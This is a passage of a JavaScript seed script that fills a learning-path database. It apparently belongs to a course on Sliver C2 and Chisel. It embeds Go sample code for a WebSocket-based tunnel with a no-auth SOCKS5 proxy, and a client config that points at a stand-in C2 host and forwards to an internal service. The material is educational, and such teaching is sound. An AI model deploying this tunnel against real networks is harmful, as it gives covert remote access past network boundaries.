	defer c.mutex.Unlock()

	if c.reader == nil {
		_, reader, err := c.conn.NextReader()
		if err != nil {
			return 0, err
		}
		c.reader = reader
	}

	n, err := c.reader.Read(b)
	if err == io.EOF {
		c.reader = nil
		return n, nil
	}
	return n, err
}

func (c *WebSocketNetConn) Write(b []byte) (int, error) {
	err := c.conn.WriteMessage(websocket.BinaryMessage, b)
	if err != nil {
		return 0, err
	}
	return len(b), nil
}

func (c *WebSocketNetConn) Close() error {
	return c.conn.Close()
}

func (c *WebSocketNetConn) LocalAddr() net.Addr {
	return c.conn.LocalAddr()
}

func (c *WebSocketNetConn) RemoteAddr() net.Addr {
	return c.conn.RemoteAddr()
}

func (c *WebSocketNetConn) SetDeadline(t time.Time) error {
	return nil
}

func (c *WebSocketNetConn) SetReadDeadline(t time.Time) error {
	return c.conn.SetReadDeadline(t)
}

func (c *WebSocketNetConn) SetWriteDeadline(t time.Time) error {
	return c.conn.SetWriteDeadline(t)
}

// SOCKS5Server provides SOCKS5 proxy through tunnel
type SOCKS5Server struct {
	session *yamux.Session
}

func NewSOCKS5Server(session *yamux.Session) *SOCKS5Server {
	return &SOCKS5Server{session: session}
}

func (s *SOCKS5Server) ListenAndServe(addr string) error {
	listener, err := net.Listen("tcp", addr)
	if err != nil {
		return err
	}
	defer listener.Close()

	log.Printf("SOCKS5 listening on %s", addr)

	for {
		conn, err := listener.Accept()
		if err != nil {
			continue
		}

		go s.handleConn(conn)
	}
}

func (s *SOCKS5Server) handleConn(conn net.Conn) {
	defer conn.Close()

	// SOCKS5 handshake
	buf := make([]byte, 256)

	// Read version and auth methods
	n, err := conn.Read(buf)
	if err != nil || n < 2 || buf[0] != 0x05 {
		return
	}

	// No auth required
	conn.Write([]byte{0x05, 0x00})

	// Read request
	n, err = conn.Read(buf)
	if err != nil || n < 7 {
		return
	}

	// Parse request
	// buf[0] = version (0x05)
	// buf[1] = command (0x01 = connect)
	// buf[2] = reserved
	// buf[3] = address type

	var target string
	switch buf[3] {
	case 0x01: // IPv4
		target = fmt.Sprintf("%d.%d.%d.%d:%d",
			buf[4], buf[5], buf[6], buf[7],
			int(buf[8])<<8|int(buf[9]))
	case 0x03: // Domain
		domainLen := int(buf[4])
		domain := string(buf[5 : 5+domainLen])
		port := int(buf[5+domainLen])<<8 | int(buf[6+domainLen])
		target = fmt.Sprintf("%s:%d", domain, port)
	case 0x04: // IPv6
		// Handle IPv6...
		return
	default:
		return
	}

	// Open stream through tunnel
	stream, err := s.session.Open()
	if err != nil {
		conn.Write([]byte{0x05, 0x01, 0x00, 0x01, 0, 0, 0, 0, 0, 0})
		return
	}
	defer stream.Close()

	// Send target to server
	stream.Write([]byte(target + "\\n"))

	// Success response
	conn.Write([]byte{0x05, 0x00, 0x00, 0x01, 0, 0, 0, 0, 0, 0})

	// Bidirectional copy
	var wg sync.WaitGroup
	wg.Add(2)

	go func() {
		io.Copy(stream, conn)
		wg.Done()
	}()

	go func() {
		io.Copy(conn, stream)
		wg.Done()
	}()

	wg.Wait()
}

func main() {
	// Example: Client mode
	config := &Config{
		Server:    "https://c2.example.com",
		Remotes:   []string{"8080:internal:80"},
		KeepAlive: 30 * time.Second,
		SOCKS5:    true,
		SOCKS5Addr: ":1080",
	}

	client := NewClient(config)
	if err := client.Connect(); err != nil {
		log.Fatal(err)
	}
	client.Run()
}
\`\`\``
          }
        ]
      }
    ]
  }
];

// Insert all data
const insertPath = db.prepare(`
  INSERT INTO paths (name, description, icon, color, language, skills, difficulty, estimated_weeks, schedule)
  VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
`);

const insertModule = db.prepare(`
  INSERT INTO modules (path_id, name, description)
  VALUES (?, ?, ?)
`);

const insertTask = db.prepare(`
  INSERT INTO tasks (module_id, title, description, details)
  VALUES (?, ?, ?, ?)
`);

for (const path of paths) {
  const pathResult = insertPath.run(
    path.name,
    path.description,
    path.icon,
    path.color,
    path.language,
    path.skills,
    path.difficulty,
    path.estimated_weeks,
    path.schedule
  );
  const pathId = pathResult.lastInsertRowid;

  for (const module of path.modules) {
    const moduleResult = insertModule.run(pathId, module.name, module.description);
    const moduleId = moduleResult.lastInsertRowid;

    for (const task of module.tasks) {
      insertTask.run(moduleId, task.title, task.description, task.details);
    }
  }
}

console.log('Seeded: Sliver C2 & Chisel');
